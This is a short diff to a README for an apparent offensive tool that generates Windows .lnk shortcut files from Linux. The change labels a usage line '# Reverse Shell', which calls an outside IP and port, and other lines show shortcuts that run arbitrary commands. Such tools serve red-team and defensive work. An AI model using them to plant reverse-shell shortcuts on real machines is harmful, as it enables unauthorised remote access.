@@ -6,7 +6,7 @@ Generate Windows shortcut files (.lnk) from Linux.
 
 ### Command line
 ```bash
-python3 lnk_generator.py -r 192.168.1.10 4444
+python3 lnk_generator.py -r 192.168.1.10 4444 # Reverse Shell
 python3 lnk_generator.py -c "ping 8.8.8.8"
 python3 lnk_generator.py -c "calc.exe" -o calculator.lnk
 ```
